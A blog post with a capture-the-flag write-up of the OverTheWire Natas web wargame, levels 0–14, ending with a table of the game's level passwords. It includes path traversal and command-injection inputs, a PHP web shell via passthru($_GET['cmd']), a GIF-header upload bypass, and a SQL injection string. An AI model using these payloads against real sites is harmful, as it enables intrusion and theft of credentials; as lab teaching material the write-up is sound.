---
layout: post
title: 'OverTheWire "Natas" writeup'
date: 2021-10-09 00:00:00 +0200
categories: over-the-wire
---

## DISCLAIMER

_Because it's not a real writeup if it doesn't start with a disclaimer._\
\
This writeup is not intended to ruin the game to anyone. Passwords are omitted in the whole document, and published in a table you can find at the end of the page.\
If you haven't tried to solve the game on your own, try to follow the hints in the next paragraphs before following the easy route.\
\
_Link to the [game](https://overthewire.org/wargames/natas/)._

## THE RED THREAD

Using the console is always the first thing you should do. It gives hints, info and sometimes the password itself! \
When exploring a website, to access files, folders and whatsoever, you can simply append the path to the URL. This is really important to beat the game! \
To intercept requests and modify them, I use `burpsuite` (free edition is more than enough), but even the one offered by the Browser might suffice.

## SPOILER-FREE SOLUTIONS

# Natas 0:

Go to http://natas0.natas.labs.overthewire.org/ and enter the credentials given for the 0th level

# Natas 0 -> Natas 1:

Inspecting the page gives all the clues... and more!

# Natas 1 -> Natas 2:

Same as above. Just find another way to open the developer tools.

# Natas 2 -> Natas 3:

There really is nothing on the main page. Only an hint: a files/pixel.png. Guess what: it's a pixel. How interesting. What's peculiar is the fact that the image is in a folder called "files". I wonder what's in the same directory...

# Natas 3 -> Natas 4:

Now there really is nothing rendered on the page that is useful. But there is a comment in the source code that is really interesting:

```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Interesting indeed. Why wouldn't google find it this time? Let's check the place where you can tell google not to search for something: `robots.txt`. The only excluded folder here is something called `/s3cr3t/`...

# Natas 4 -> Natas 5:

This was a weird one. You need to change the request header to fool the level into thinking you come from Natas 5. Use tag `Refer:` 😉

# Natas 5 -> Natas 6:

Similar to the last one. Check the request header and login!

# Natas 6 -> Natas 7:

So... First thing to do is to actually `View sourcecode`. There is something that is not shown into the HTML accessed via the Developer Tools: an `#include` directive. Trying to open the file shows a white page. But is the HTML really just an empty head and body?

# Natas 7 -> Natas 8:

Both hyperlinks are basically the same for the purpose of the solution. Inspecting the destination HTML shows an hint in the comments that almost gives the solution:

```html
<!--hint: password for webuser natas8 is in /etc/natas_webpass/natas8-->
```

Now, trying to access the folder directory gives a 404 response (not found). We must access that file somehow. Back to the `home` and `about` hyperlinks: they are linked to something peculiar, a query (index.php?page=<home|about>). We can try to exploit this by setting the URI param to `/etc/natas_webpass/natas8`. Broken pipe. It's not a 404 tho. \
Basically, the path is not in the included paths. But in them there's `.`. Let's just try to go back to the `/` folder by chaining as many `../` as possible before our target: `../../../../../../../etc/natas_webpass/natas8` does work!

# Natas 8 -> Natas 9:

This one is fun. Look into the sourcecode. There's an encrypted secret. We basically have to check what is the string that when encoded with the `encodeSecret` function is equal to the secret. Just do a step by step encoding of the secret and see what happens.

# Natas 9 -> Natas 10:

Our first code injection. As always, let's `View sourcecode`. At one point, the `passthru` php function is called with _no input check whatsoever_. Let's just put some commands in our search box and see what happens. Let's try with `yo yo ; whoami #`. The whoami function works. I wonder what can we use this for. Maybe a cat on some password...

# Natas 10 -> Natas 11:

Similar to the last challenge. This time we cannot use ;, \| or &. We can use `grep` to print the content of a file. Let's just pass a wildcard (`.*`) and the file we want to check (`/etc/natas_webpass/natas11`)...

# Natas 11 -> Natas 12:

Most difficult one so far. Let's `view sourcecode`. There are some things that are crucial to study and understand here:

```php
<?
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
?>
```

XOR encryption is a type of additive cipher. What this mean is that, using this algorithm, these properties are always true:

1. DECRYPTED TEXT **XOR** KEY = ENCRYPTED TEXT
2. ENCRYPTED TEXT **XOR** KEY = DECRYPTED TEXT
3. DECRYPTED TEXT **XOR** ENCRYPTED TEXT = KEY

To solve the problem we **MUST** get the key somehow. We can use property 3, as we already have a decrypted data: our cookie!

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```

If we intercept the request, in the header, we can find the encrypted data:

```text
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

If we apply the algorithm using the array encoded with json*encode (\_little of trial and error here, but my bad. It's a request, it must be a json!*) and our encrypted data decoded from base64 (_if you find an `=` character at the end of a string, you can almost always be sure it is encoded in base64_), we can easily fetch the key:

```php
<?
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="));
?>

Output: qw8Jqw8Jqw8Jqw8Jq
```

Here's our key: `qw8J`! \
Now, we can create our Cookie to inject into the request header:

```php
<?
function xor_encrypt($in) {
    $key = "qw8J";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt(json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
?>

Output: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

We did it. Onto level 12!

# Natas 12 -> Natas 13:

This challenge teaches us that it is wrong to let upload files without the right checks. Basically, just create a PHP script as this one:
```php
<?
passthru("cat /etc/natas_webpass/natas13");
?>
```
I called it "test.php". Once you did it, upload the file on the website, and intercept the request, changing the file extension randomly generated to PHP. \
\
_FYI if we want to be extremly flexible and spawn an actual shell, we could've ```<?passthru($_GET["cmd"]);?>``` instead, and pass commands as parameters._

# Natas 13 -> Natas 14:

We need to trick the php script into thinking the code we are submitting is, indeed, an image. Researching about how does the `exif_imagetype()` function works, shows something peculiar. From the [official documentation](https://www.php.net/manual/en/function.exif-imagetype.php):
```
exif_imagetype() reads the first bytes of an image and checks its signature.

exif_imagetype() can be used to avoid calls to other exif functions with unsupported file types or in conjunction with $_SERVER['HTTP_ACCEPT'] to check whether or not the viewer is able to see a specific image in the browser. 
```

So, it only checks the first bytes of an image and check its signature. Ain't that smart? \
Let's look for some [valid signatures](https://www.garykessler.net/library/file_sigs.html) online for image files. The easiest ones to put in code are GIFs. \
Let's make a new `test.php`, but this time let's actually change the first bytes of the file with the one of a valid signature:
```php
GIF87a
<?
passthru($_GET["cmd"]);
?>
```
Then let's do what we did until now...

# Natas 14 -> Natas 15:

SQL Injection? SQL Injection. Your username should be `a" OR 1=1 #`. Input sanification is **REALLY** important!

## PASSWORDS (SPOILERS)

_You have been warned. Scroll up or admit defeat._\
\
_You wanted to beat Natas, but you got Nada._\
\
_As you wish._

| Level            | Password                         |
| ---------------- | -------------------------------- |
| Lev 0            | natas0                           |
| Lev 0 -> Lev 1   | gtVrDuiDfck831PqWsLEZy5gyDz1clto |
| Lev 1 -> Lev 2   | ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi |
| Lev 2 -> Lev 3   | sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 |
| Lev 3 -> Lev 4   | Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ |
| Lev 4 -> Lev 5   | iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq |
| Lev 5 -> Lev 6   | aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 |
| Lev 6 -> Lev 7   | 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 |
| Lev 7 -> Lev 8   | DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe |
| Lev 8 -> Lev 9   | W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl |
| Lev 9 -> Lev 10  | nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu |
| Lev 10 -> Lev 11 | U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK |
| Lev 11 -> Lev 12 | EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 |
| Lev 12 -> Lev 13 | jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY |
| Lev 13 -> Lev 14 | Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 |
| Lev 14 -> Lev 15 | AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J |

